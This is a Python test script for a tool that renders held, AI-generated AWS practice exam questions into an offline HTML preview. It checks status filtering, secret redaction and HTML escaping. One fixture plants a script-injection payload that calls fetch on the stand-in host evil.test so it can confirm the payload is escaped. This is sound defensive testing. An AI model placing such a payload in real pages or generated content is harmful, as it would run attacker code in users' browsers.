"""Verify safe offline preview of held candidates; never modify question bank/keys."""
import importlib.util
import copy
import json
import re
import tempfile
from pathlib import Path

spec=importlib.util.spec_from_file_location('lp','release_files/live_progress.py')
lp=importlib.util.module_from_spec(spec)
spec.loader.exec_module(lp)

def q(qid):
    return {'id':qid,'exam':'SAA-C03','domain':'D2','type':'multiple',
      'question':'AWS上で複数リージョンの非同期イベント処理を行う企業です。コストと可用性の要件を満たすためにはどの設計が適切ですか？2つ選択せよ。',
      'choices':{'A':'SQS','B':'SNS','C':'EventBridge','D':'Lambda','E':'CloudWatch'},
      'correct':['A','B'],
      'explanation':'【A】SQSは受信側を非同期化します。【B】SNSはメッセージのファンアウトに利用できます。【C】EventBridgeはイベントルーティングを支援しますが、この具体的な選択では要件外です。【D】Lambdaは実行環境です。【E】CloudWatchは監視機能です。',
      'source':{'kind':'original','label':'secret-source-not-exported','token':'TOP_SECRET'}}

with tempfile.TemporaryDirectory() as d:
    root=Path(d)
    (root/'work').mkdir()
    pwa=root/'AI_Study'
    pwa.mkdir()
    (pwa/'questions.json').write_text('{"questions":[{"id":"ORIGINAL"}]}',encoding='utf8')
    (pwa/'index.html').write_text('<p>ORIGINAL</p>',encoding='utf8')
    (pwa/'sw.js').write_text("const CACHE='ai-study-old';",encoding='utf8')
    before={p:p.read_bytes() for p in pwa.iterdir()}
    valid=q('SAA-AUTO-00100')
    # Attempted/rejected revision must not enter even when its original status is held.
    excluded=q('SAA-AUTO-00101')
    malicious=q('SAA-AUTO-00102')
    malicious['explanation']+=' </script><script>fetch("https://evil.test/secret")</script> & <div>'
    blocked=q('SAA-AUTO-00103')
    bad_review=q('SAA-AUTO-00104')
    short=q('SAA-AUTO-00105')
    short['question']='short'
    data={'generated':{
      valid['id']:{'status':'QUALITY_HOLD','candidate':valid,
                   'audit':[{'review':{'verdict':'PASS','issues':[]}}]},
      excluded['id']:{'status':'QUALITY_HOLD','candidate':excluded,
                    'audit':[{'review':{'verdict':'PASS','issues':[]}}]},
      malicious['id']:{'status':'QUALITY_HOLD','candidate':malicious,
                       'audit':[{'review':{'verdict':'PASS','issues':[]}}]},
      blocked['id']:{'status':'REVISE_UNRESOLVED','candidate':blocked,
                   'audit':[{'review':{'verdict':'REVISE','issues':['bad']}}]},
      bad_review['id']:{'status':'QUALITY_HOLD','candidate':bad_review,
                   'audit':[{'review':{'verdict':'REVISE','issues':['bad']}}]},
      short['id']:{'status':'QUALITY_HOLD','candidate':short,
                   'audit':[{'review':{'verdict':'PASS'}}]},
    },'revision_trials':{'SAA-AUTO-00101':{'status':'REVISION_REQUESTED'}},
       'credentials':{'openai_key':'SHOULD_NEVER_EXPOSE'}}
    stored=copy.deepcopy(data)
    (root/'work'/'state.json').write_text(json.dumps(data,ensure_ascii=False),encoding='utf8')
    result=lp.preview_practice(root)
    assert result['status']=='CREATED' and result['count']==2,result
    page=Path(result['path']).read_text(encoding='utf8')
    assert '未検証' in page
    assert 'ネットにも送信しません' in page
    assert 'TOP_SECRET' not in page and 'SHOULD_NEVER_EXPOSE' not in page
    assert 'secret-source-not-exported' not in page
    assert '</script><script>fetch(' not in page
    assert '\\u003c/script\\u003e' in page
    assert 'localStorage' not in page
    assert '<script>fetch(' not in page  # model text must never become executable HTML
    payload=re.search(r'const questions=(.*?);\nlet index=',page,re.S)
    assert payload,payload
    parsed=json.loads(payload.group(1))
    assert [x['id'] for x in parsed]==['SAA-AUTO-00100','SAA-AUTO-00102']
    assert parsed[0]['correct']==['A','B']
    assert set(parsed[0])=={'id','domain','type','question','choices','correct','explanation'}
    assert json.loads((root/'work'/'state.json').read_text(encoding='utf8'))==stored
    assert {p:p.read_bytes() for p in pwa.iterdir()}==before
    assert lp.preview_practice(root)['count']==2
    assert {p:p.read_bytes() for p in pwa.iterdir()}==before
    data['generated']={}
    (root/'work'/'state.json').write_text(json.dumps(data),encoding='utf8')
    assert lp.preview_practice(root)['status']=='NO_CANDIDATES'
    assert lp.preview_practice(root/'not-there')['status']=='NO_STATE'
print('PASS offline, no API, no PWA/history mutation, reject bad statuses, safe HTML escaping')
